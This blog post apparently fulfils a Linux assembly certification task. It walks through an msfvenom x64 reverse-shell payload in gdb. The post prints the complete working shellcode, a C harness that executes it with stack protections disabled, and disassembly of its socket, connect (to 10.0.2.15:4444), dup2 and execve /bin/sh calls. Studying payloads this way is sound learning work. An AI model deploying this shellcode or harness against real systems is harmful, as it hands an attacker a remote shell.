This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert Certification](https://www.pentesteracademy.com/course?id=7). The task for 5.3/7 assignment is to analyse at least 3 shellcode examples created using Msfpayload for linux/x86_64. Since msfpayload is outdated, I used msfvenom instead. The analysis of the shellcodes is carried out using the gdb debugger and 3/3 shellcode analysed in this article is the shell_reverse_tcp payload.

### MSFvenom generated linux/x64/shell_reverse_tcp payload

As a follow up to analysing [exec shellcode](/blog/2019-05-01-blog-SLAE51) and [bind shellcode](/blog/2019-05-01-blog-SLAE52), I am going to be analysing the linux/x64/shell_reverse_tcp as final payload for task number 5. This payload is used to make the connection back to the attackers machine and spawn a command shell. In order to generate the payload I used the following command:
```
msfvenom -p linux/x64/shell_reverse_tcp -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of c file: 335 bytes
unsigned char buf[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x11\x5c\x0a\x00\x02\x0f\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
```

#### Shellcode test program

In order to analyse the generated payload I am placing it into the C program which will be executing the shellcode:
```
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x11\x5c\x0a\x00\x02\x0f\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

int main()
{
  printf("Shellcode Length:  %d\n", (int)strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```

and finally compile the C program as follows:
```
gcc -m64 -fno-stack-protector -z execstack testshellcode.c -o testshellcode -no-pie
```

### Analysis

I will be taking the same type of approach in the analysis of this payload as in the previous one for bind shellcode. There are 4 syscalls being executed so let's go through them one by one. The concept of a reverse shellcode is that there is an attacker controlled machine somewhere where the attacker is waiting a connection back on a specific port and it is shellcode's job to make initiate that connection.

For that to happen this generated payload makes use of a chain of syscalls --> it first creates a new `socket()`, then attempts to `connect()` to the attacker controlled machine and once it does, it launches the `execve()` syscall.

![](/assets/img/SLAE/msfvenom_syscall2.png)

__1__ - `socket()`

* syscall number, 0x29 is placed to `rax` right in the beginning with 2 instructions `push 0x29` and `pop rax`
* cdq is then used to sign-extend the value in `rax`, which means it would zero out `rdx` which is pretty convenient
* with next push'es and pop's 0x2 and 0x1 are placed to `rdi` and `rsi` respectively, so we could finally launch the `socket()` syscall

```
   0x0000000000601060 <code+0>:  push   0x29
   0x0000000000601062 <code+2>:  pop    rax
   0x0000000000601063 <code+3>:  cdq
   0x0000000000601064 <code+4>:  push   0x2
   0x0000000000601066 <code+6>:  pop    rdi
   0x0000000000601067 <code+7>:  push   0x1
   0x0000000000601069 <code+9>:  pop    rsi
   0x000000000060106a <code+10>: syscall
```

__2__ - `connect()`

To make a connection back to the attacker controlled machine, shellcode needs to contain important information like ip and port, in our case this is all displayed to us at offset +14 where hexadecimal value is moved to rcx. What that hexadecimal value `0xf02000a5c110002` actually represents can be teared up to following bits:

* 0002 - AF_INET, ipv4 address families
* 5c11 - in little endian 115c converted to decimal gives us the port number 4444
* 0x0a00020f is the hexadecimal format of an IP address 10.0.2.15

As `connect()` syscall has 3 arguments `int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);` we need to prepare the corresponding registers `rdi`, `rsi` and `rdx`. By pushing `rcx` to the stack and then moving it to `rsi` we prepare the 2nd argument. The following `push 0x10` which we then immediately pop into `rdx` is the overall size of the `sockaddr *addr` structure, which is 16 bytes. And as usual, you can find the syscall number from `rax`

```
   0x000000000060106c <code+12>: xchg   rdi,rax
   0x000000000060106e <code+14>: movabs rcx,0xf02000a5c110002
   0x0000000000601078 <code+24>: push   rcx
   0x0000000000601079 <code+25>: mov    rsi,rsp
   0x000000000060107c <code+28>: push   0x10
   0x000000000060107e <code+30>: pop    rdx
   0x000000000060107f <code+31>: push   0x2a
   0x0000000000601081 <code+33>: pop    rax
   0x0000000000601082 <code+34>: syscall
```

__3__ - `dup2()`

Next we are duplicating file descriptors and as we have seen in the previous post about bind shell, msfvenon generates this part so that it is done in a loop for duplicating stdin-1, stdout-2 and stdout-3.

```
   0x0000000000601084 <code+36>: push   0x3
   0x0000000000601086 <code+38>: pop    rsi
   0x0000000000601087 <code+39>: dec    rsi
   0x000000000060108a <code+42>: push   0x21
   0x000000000060108c <code+44>: pop    rax
   0x000000000060108d <code+45>: syscall
   0x000000000060108f <code+47>: jne    0x601087 <code+39>

```

__4__ - `execve()`

and finally the reverse shell launches the `execve()` syscall where `0x68732f6e69622f` marks that the program to be launched is `/bin/sh`
```
   0x0000000000601091 <code+49>: push   0x3b
   0x0000000000601093 <code+51>: pop    rax
   0x0000000000601094 <code+52>: cdq
   0x0000000000601095 <code+53>: movabs rbx,0x68732f6e69622f
   0x000000000060109f <code+63>: push   rbx
   0x00000000006010a0 <code+64>: mov    rdi,rsp
   0x00000000006010a3 <code+67>: push   rdx
   0x00000000006010a4 <code+68>: push   rdi
   0x00000000006010a5 <code+69>: mov    rsi,rsp
   0x00000000006010a8 <code+72>: syscall
```

So the whole concept of this shellcode looks pretty much as I have already described in the blog post about [reverse shell](../../blog/2019-01-25-blog-SLAE2/).
